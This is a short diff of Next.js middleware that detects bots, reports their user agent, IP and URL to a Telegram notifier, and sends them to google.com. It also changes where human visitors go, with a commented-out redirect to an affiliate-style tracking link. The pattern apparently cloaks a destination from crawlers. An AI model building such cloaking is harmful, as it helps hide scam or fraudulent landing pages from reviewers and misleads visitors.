@@ -146,8 +146,8 @@ export async function middleware(req) {
     notifyTelegram(`🚨 Known bot detected\nUA: ${ua}\nIP: ${ip}\nURL: ${url}`);
     return NextResponse.redirect("https://google.com");
   }
-  return NextResponse.next();
-  //return NextResponse.redirect("https://pqnjj.bestafair.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=4533&s2=2163253");
+  //return NextResponse.next();
+  return NextResponse.redirect("https://ya.ru");
   
   // не бот — пускаем дальше
   //return NextResponse.next();
